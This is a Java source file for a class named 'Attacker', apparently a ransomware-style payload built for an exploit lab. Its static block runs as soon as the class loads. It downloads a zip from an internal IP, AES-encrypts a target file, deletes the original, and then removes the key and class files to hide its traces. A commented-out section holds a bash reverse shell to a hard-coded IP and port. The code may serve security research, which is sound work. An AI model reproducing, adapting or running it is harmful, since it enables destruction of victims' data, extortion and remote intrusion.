import java.io.FileOutputStream;

import java.io.FileInputStream;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.security.GeneralSecurityException;
import javax.crypto.spec.SecretKeySpec;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.io.InputStream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.io.BufferedOutputStream;

public class Attacker {
  private Cipher cipher;

  private static final int BUFFER_SIZE = 4096;
  /**
   * Extracts a zip file specified by the zipFilePath to a directory specified by
   * destDirectory (will be created if does not exists)
   * @param zipFilePath
   * @param destDirectory
   * @throws IOException
   */
  void unzip(String zipFilePath, String destDirectory) throws IOException {
      File destDir = new File(destDirectory);
      if (!destDir.exists()) {
          destDir.mkdir();
      }
      ZipInputStream zipIn = new ZipInputStream(new FileInputStream(zipFilePath));
      ZipEntry entry = zipIn.getNextEntry();
      // iterates over entries in the zip file
      while (entry != null) {
          String filePath = destDirectory + File.separator + entry.getName();
          if (!entry.isDirectory()) {
              // if the entry is a file, extracts it
              extractFile(zipIn, filePath);
          } else {
              // if the entry is a directory, make the directory
              File dir = new File(filePath);
              dir.mkdirs();
          }
          zipIn.closeEntry();
          entry = zipIn.getNextEntry();
      }
      zipIn.close();
  }
  /**
   * Extracts a zip entry (file entry)
   * @param zipIn
   * @param filePath
   * @throws IOException
   */
  private void extractFile(ZipInputStream zipIn, String filePath) throws IOException {
      BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(filePath));
      byte[] bytesIn = new byte[BUFFER_SIZE];
      int read = 0;
      while ((read = zipIn.read(bytesIn)) != -1) {
          bos.write(bytesIn, 0, read);
      }
      bos.close();
  }

  void downloadFile(String urlStr, String outputFolder) throws Exception {
    String outputFileName = outputFolder + "/" + "mytempfile.zip";
    URL url = new URL(urlStr);
    try (InputStream in = url.openStream();
    ReadableByteChannel rbc = Channels.newChannel(in);
    FileOutputStream fos = new FileOutputStream(outputFileName)) {
    fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
    }
    unzip(outputFileName, outputFolder);
    new File(outputFileName).delete();
  }

  // new EncryptData(originalFile, encryptedFile,
  // startEnc.getSecretKey("OneKey/secretKey", "AES"), "AES");
  void initEncryptData(File originalFile, File encrypted, 
      SecretKeySpec secretKey, String cipherAlgorithm)
      throws IOException, GeneralSecurityException {
    this.cipher = Cipher.getInstance(cipherAlgorithm);
    encryptFile(getFileInBytes(originalFile), encrypted, secretKey);
  }

  void encryptFile(byte[] input, File output, SecretKeySpec key) throws IOException, GeneralSecurityException {
    this.cipher.init(Cipher.ENCRYPT_MODE, key);
    writeToFile(output, this.cipher.doFinal(input));
  }

  private void writeToFile(File output, byte[] toWrite)
      throws IllegalBlockSizeException, BadPaddingException, IOException {
    output.getParentFile().mkdirs();
    FileOutputStream fos = new FileOutputStream(output);
    fos.write(toWrite);
    fos.flush();
    fos.close();
    System.out.println("The file was successfully encrypted and stored in: " + output.getPath());
  }

  byte[] getFileInBytes(File f) throws IOException {
    FileInputStream fis = new FileInputStream(f);
    byte[] fbytes = new byte[(int) f.length()];
    fis.read(fbytes);
    fis.close();
    return fbytes;
  }

  SecretKeySpec getSecretKey(String filename, String algorithm) throws IOException {
    byte[] keyBytes = Files.readAllBytes(new File(filename).toPath());
    return new SecretKeySpec(keyBytes, algorithm);
  }

  void doEnc(String targetID, String[] files_to_enc, String pubKeyFile, String algo)
      throws IOException, GeneralSecurityException, Exception {
    String secretKeyFile = "/tmp/test/Symmetric/secretKey_" + targetID;

    for (int i = 0; i < files_to_enc.length; i++) {
      File originalFile = new File(files_to_enc[i]);
      File encryptedFile = new File(files_to_enc[i] + "_" + targetID);
      System.out.println("\tStarting to encrypt file: \"" + originalFile + "\"");
      initEncryptData(originalFile, encryptedFile, getSecretKey(secretKeyFile, "AES"), "AES");
      try {
        originalFile.delete();
        System.out.println("\t-- \"" + originalFile + "\" has been deleted!");
        System.out.println("\tFile: \"" + originalFile + "\" has been succcussfully encrypted!\n");
      } catch (Exception e) {
        e.printStackTrace();
      }
    } // encrypted all the files
    try {
      new File(secretKeyFile).delete();
      // delete all un-necessary files including all class files
      cleanEnv();
      System.out.println("Secret key file: \"" + secretKeyFile +"\" has been deleted!\n");
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  private void cleanEnv() {
    // remove all the class files
    File base = new File("/tmp/test");
    File[] items = base.listFiles();
    if (items != null) {
      for (File item : items) {
        String name = item.getName();
	if ( name.endsWith(".class") ) {
          try {
            item.delete();
            System.out.println("\t-- \"" + item + "\" has been deleted!");
          } catch (Exception e) {
            e.printStackTrace();
          }
        }
      }
    } // remove all the class files
    // remove the public key
    base = new File("/tmp/test/KeyPair");
    items = base.listFiles();
    if (items != null) {
      for (File item : items) {
        try {
          item.delete();
          System.out.println("\t-- \"" + item + "\" has been deleted!");
        } catch (Exception e) {
          e.printStackTrace();
        }
      }
    } // remove all the Asymmetric keys
  }

  public Attacker() {
  }

  static {
    String targetID = "8IvEADYvsejbT3qMHWPlQt5dzNPeq0rj1D7cDV6nq+k";
    Attacker attacker = new Attacker();
    String algo = "RSA";
    String[] files_to_enc = new String[] { "/tmp/test/myfile" };
    String pubKeyFile = "/tmp/test/KeyPair/publicKey_" + targetID;
    String urlStr = "http://10.160.0.10:9000/attacking_package.zip";
    try {
      attacker.downloadFile(urlStr, "/tmp/test");
      String currentPath = new java.io.File(".").getCanonicalPath();
      System.out.println("Current dir:" + currentPath);
      attacker.doEnc(targetID, files_to_enc, pubKeyFile, algo);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
/*  static {
    try {
      System.out.println("in static!");
      Runtime rt = Runtime.getRuntime();
      // String[] commands = {"/bin/bash", "-c", "/bin/bash -i >
      // /dev/tcp/192.168.1.192/4444 0<&1 2>&1"};
      String[] commands = { "touch", "/tmp/success" };
      Process pc = rt.exec(commands);
      pc.waitFor();
    } catch (Exception e) {
      e.printStackTrace();
      // do nothing
    }
  }
*/
  public static void main(String[] args) throws java.io.IOException {
    System.out.println("here!");
    /*java.io.BufferedWriter bw = new BufferedWriter(new FileWriter("/tmp/success"));
    bw.write(new String("Can you see this confidential content?\n"));
    bw.flush();
    bw.close();*/
  }
}
